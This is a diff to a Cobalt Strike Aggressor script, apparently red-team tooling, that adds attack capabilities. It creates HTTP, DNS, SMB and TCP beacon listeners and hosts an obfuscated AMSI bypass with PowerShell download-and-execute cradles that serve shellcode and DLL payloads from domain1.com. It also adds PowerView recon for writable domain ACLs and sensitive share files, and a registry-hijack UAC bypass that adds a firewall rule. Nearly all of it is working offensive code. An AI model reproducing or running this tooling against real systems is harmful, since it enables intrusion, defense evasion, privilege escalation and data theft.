@@ -24,7 +24,162 @@ $PORTBENDER_DLL     = getFileProper("C:\\Tools\\PortBender","PortBender.dll");
 $KRBRELAY_PATH      = getFileProper("C:\\Tools\\KrbRelay\\KrbRelay\\bin\\Release","KrbRelay.exe");
 $SHARPSPOOL_PATH    = getFileProper("C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release","SharpSpoolTrigger.exe");
 $SHARPDPAPI_PATH    = getFileProper("C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release","SharpDPAPI.exe");
+$TCPSCRIPT = getFileProper("C:\\Payloads\\","TCP_X64.ps1");
+$SMBSCRIPT = getFileProper("C:\\Payloads\\","SMB_X64.ps1");
+$HTTPSCRIPT  = getFileProper("C:\\Payloads\\","HTTP_X64.ps1");
+$DNSCRIPT = getFileProper("C:\\Payloads\\","DNS_X64.ps1");
+$TCPBIN = getFileProper("C:\\Payloads\\","TCP_X64.xprocess.bin");
+$SMBBIN = getFileProper("C:\\Payloads\\","SMB_X64.xprocess.bin");
+$HTTPBIN  = getFileProper("C:\\Payloads\\","HTTP_X64.xprocess.bin");
+$DNSBIN = getFileProper("C:\\Payloads\\","DNS_X64.xprocess.bin");
+$TCPDLL = getFileProper("C:\\Payloads\\","TCP_X64.dll");
+$SMBDLL = getFileProper("C:\\Payloads\\","SMB_X64.dll");
+$HTTPDLL  = getFileProper("C:\\Payloads\\","HTTP_X64.dll");
+$DNSDLL = getFileProper("C:\\Payloads\\","DNS_X64.dll");
+  
+sub read_and_return_file
+{
+	local('$handle $file');
 
+	$handle = openf("$1");
+	$file = readb($handle, -1);
+	closef($handle);
+	return $file;
+ }
+
+
+#generate random printable text of $length
+
+sub rand_alphanum {
+  local('$length $out $charstr $i $index');
+  $length = $1;
+  $charstr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890';
+  $out = '';
+
+  for($i = 0; $i < $length; $i++)
+  {
+    $index = rand(strlen($charstr));
+    $out = $out . substr($charstr, $index, $index + 1);
+
+  }
+  return $out;
+}
+
+
+sub pdetail
+{
+  if ($2 == "INFO")
+  {
+   println("\cC[*] \o" . $1);
+
+  }else if ($2 == "GOOD") {
+
+   println("\c9[+] \o" . $1);
+
+  }else{
+   println($1);
+  }
+}
+
+command create_listeners
+{
+  pdetail("Creating Listeners","INFO");
+
+  listener_create_ext(
+    "HTTP",               # Listener name, use something unique across all teamservers (i.e., server1-http)
+    "windows/beacon_http/reverse_http", # Listener type, remember, payloads are driven by listeners
+    %(host => "domain1.com",    # Staging host, Only one staging host can be set
+      profile => "default",       # The profile variant name, variants are set in the malleable c2 profile
+      port => 80,           # Port for c2 communications
+      beacons => "domain1.com,domain2.com,domain3.com",   # Comma separated list of beacon hosts
+      althost => "",          # host header value
+      strategy => "round-robin",    # Host rotation strategy aka fail strategy
+      proxy => ""       # Proxy host settings
+    )
+  );
+
+  
+  # Create the listeners
+
+  pdetail("Creating SMB Listener","INFO");
+  listener_create_ext("SMB", "windows/beacon_bind_pipe", %(port => "msmb_039586"));
+
+  pdetail("Creating Local TCP Listener 4444","INFO");
+  listener_create_ext("TCP-LOCAL", "windows/beacon_bind_tcp", %(port => "4444", beacons => "127.0.0.1"));
+
+  pdetail("Creating Local TCP Listener 8082","INFO");
+  listener_create_ext("TCP-LOCAL-8082", "windows/beacon_bind_tcp", %(port => "8082", beacons => "127.0.0.1"));
+
+  pdetail("Creating TCP Listener","INFO");
+  listener_create_ext("TCP", "windows/beacon_bind_tcp", %(port => "4444", beacons => "0.0.0.0"));
+
+  pdetail("Creating DNS Listener","INFO");
+
+  listener_create_ext(
+
+    "DNS",               # Listener name, use something unique across all teamservers (i.e., server1-http)
+    "windows/beacon_dns/reverse_dns_txt", # Listener type, remember, payloads are driven by listeners
+    %(host => "something.domain4.com",    # Staging host, Only one staging host can be set
+      profile => "default",       # The profile variant name, variants are set in the malleable c2 profile
+      port => 53,           # Port for c2 communications
+      beacons => "something.domain4.com",   # Comma separated list of beacon hosts
+      strategy => "round-robin"    # Host rotation strategy aka fail strategy
+    ));
+
+  sleep(10000);
+
+  # Kill the default stager uri's as they can be used to request the staged payloads.
+  
+  
+  
+  site_kill(80, "stager");
+  site_kill(80, "stager64");
+  pdetail("Done!","GOOD");
+
+}
+
+  
+  
+
+command generate_payloads
+{
+local('$folder');
+pdetail("Generating Payloads","INFO");
+$folder = all_payloads("C:\\Payloads\\", 0, "Indirect");
+pdetail("Payloads have been saved to $folder","INFO");
+
+}
+
+command host_files
+{
+  pdetail("Hosting files","INFO");
+  site_host("domain1.com", 80, "/bypass", "\$PgHkyz=[Ref].\"a`ssEm`BlY\".\"GE`TTYp`es\"();Foreach(\$PgfdHkyz in \$PgHkyz) {if (\$PgfdHkyz.\"na`me\" -like '*iUtils') {\$PFjgfggsd=\$PgfdHkyz}};\$megawoofdggfdbdfc=\$PFjgfggsd.\"G`Etfi`elDs\"('NonPublic,Static');Foreach(\$cows in \$megawoofdggfdbdfc) {if (\$cows.\"Na`Me\" -like '*InitFailed') {\$megawoof=\$cows}};\$megawoof.\"SE`TVA`lUe\"(\$null,\$true)", "text/plain", "bypass", false);
+  site_host("domain1.com", 80, "/dns", "iex (new-object net.webclient).downloadstring(\"http://domain1.com/bypass\"); iex (new-object net.webclient).downloadstring(\"http://domain1.com/adns\")", "text/plain", "dns", false);
+  site_host("domain1.com", 80, "/http", "iex (new-object net.webclient).downloadstring(\"http://domain1.com/bypass\"); iex (new-object net.webclient).downloadstring(\"http://domain1.com/ahttp\")", "text/plain", "http", false);
+  site_host("domain1.com", 80, "/smb", "iex (new-object net.webclient).downloadstring(\"http://domain1.com/bypass\"); iex (new-object net.webclient).downloadstring(\"http://domain1.com/asmb\")", "text/plain", "smb", false);
+  site_host("domain1.com", 80, "/tcp", "iex (new-object net.webclient).downloadstring(\"http://domain1.com/bypass\"); iex (new-object net.webclient).downloadstring(\"http://domain1.com/atcp\")", "text/plain", "tcp", false);
+
+
+
+  site_host("domain1.com", 80, "/atcp", read_and_return_file($TCPSCRIPT), "text/plain", "atcp", false);
+  site_host("domain1.com", 80, "/ahttp", read_and_return_file($HTTPSCRIPT), "text/plain", "ahttp", false);
+  site_host("domain1.com", 80, "/asmb", read_and_return_file($SMBSCRIPT), "text/plain", "asmb", false);
+  site_host("domain1.com", 80, "/adns", read_and_return_file($DNSCRIPT), "text/plain", "adns", false);
+
+
+  site_host("domain1.com", 80, "/tcp.bin", read_and_return_file($TCPBIN), "text/plain", "tcp shellcode", false);
+  site_host("domain1.com", 80, "/http.bin", read_and_return_file($HTTPBIN), "text/plain", "http shellcode", false);
+  site_host("domain1.com", 80, "/smb.bin", read_and_return_file($SMBBIN), "text/plain", "smb shellcode", false);
+  site_host("domain1.com", 80, "/dns.bin", read_and_return_file($DNSBIN), "text/plain", "dns shellcode", false);
+
+  site_host("domain1.com", 80, "/tcp.dll", read_and_return_file($TCPDLL), "text/plain", "tcp dll", false);
+  site_host("domain1.com", 80, "/http.dll", read_and_return_file($HTTPDLL), "text/plain", "http dll", false);
+  site_host("domain1.com", 80, "/smb.dll", read_and_return_file($SMBDLL), "text/plain", "smb dll", false);
+  site_host("domain1.com", 80, "/dns.dll", read_and_return_file($DNSDLL), "text/plain", "dns dll", false);
+
+  pdetail("Done!","GOOD");
+}
+  
 #TEST FUNCTION
 command beacons {
    local('$entry $key $value');
@@ -40,19 +195,6 @@ command beacons {
 #dummy callback to get stuff to run in the correct order
 sub dummby_cb{
     blog($1,$2);
-}
-#generate random printable text of $length
-sub rand_alphanum {
-    local('$length $out $charstr $i $index');
-    $length = $1;
-    $charstr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890';
-    $out = '';
-    for($i = 0; $i < $length; $i++)
-    {
-        $index = rand(strlen($charstr));
-        $out = $out . substr($charstr, $index, $index + 1);
-    }
-    return $out;
 }
 
 #ADD INVOKE_DCOM TO JUMP COMMAND
@@ -252,6 +394,63 @@ beacon_command_register(
 )
 
 #SITUATIONAL AWARENESS FUNCTIONS
+
+
+## DOMAIN ACLS
+sub cb_get_domain_interesting_acls
+{
+  local('$command $newsid');
+  if("ERROR:" isin $2)
+  {
+    berror($1, "Error, domain SID not found");
+  }else{
+    $newsid = tr($2,"\s\r\t\n","");
+    $command = 'Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "'. $newsid .'-[\d]{4,10}" }';
+    bpowerpick($1, $command);
+
+  }
+}
+
+alias get_domain_interesting_acls
+{
+  local('$command $domainfqdn $argssize');
+  $argssize = size(@_);
+
+if ($argssize == 2 )
+{
+  $domainfqdn = $2;
+  $command = "Get-DomainSID -Domain  $+ $domainfqdn $+ ";
+  bpowerpick($1, $command,$null,$null,&cb_get_domain_interesting_acls);
+
+}else{
+  blog($1, "Specify the domain fqdn!");
+  return;
+}
+}
+
+  
+beacon_command_register (
+  "get_domain_interesting_acls",
+  " Get Writeproperty,GenericWrite,GenericAll,WriteDacl objects that match the domains SID",
+   "Usage: get_domain_interesting_acls"
+);
+
+## FIND DOMAIN FILES ON SHARES
+
+alias get_domain_fileshare_recon{
+  $command = 'Write-Host "===Interesting Files On Shares===";Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*, *.txt*,*.sql*';
+  bpowerpick($1, $command);
+
+}
+
+beacon_command_register (
+  "get_domain_fileshare_recon",
+   " Uses PowerView to find interesting files on shares",
+   "Usage: get_domain_fileshare_recon"
+
+);
+
+
 ## FIND DOMAIN SHARES
 alias get_domainShares {
     $size = size(@_);
@@ -2152,3 +2351,24 @@ beacon_command_register(
     . "Usage: applocker_getpolicy [domain]"
     ."\n"
 )
+
+
+# runasadmin uac-computerdefaults [command]
+sub computerdefaults_elevator {
+	local('$command $cradle');
+
+	# acknowledge this command
+	btask($1, "Tasked Beacon to execute $2 in a high integrity context", "T1088");
+
+	# base64 encode the command
+	$command  = transform("New-NetFirewallRule -DisplayName \"Allow Powershell\" -Direction Inbound -Program \"C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" -Action Allow;  $+ $2 $+  " , "powershell-base64");
+	$cradle = 'cmd.exe /c reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe /c start \"\" "powershell" -w hid -en ' . $command . '" /f && start computerdefaults.exe';
+    blog($1,$cradle);
+
+	# run the specified command via this exploit.
+	brun!($1,$cradle);
+
+}
+
+beacon_elevator_register("uac-computerdefaults", "Bypass UAC with computerdefaults", &computerdefaults_elevator);
+
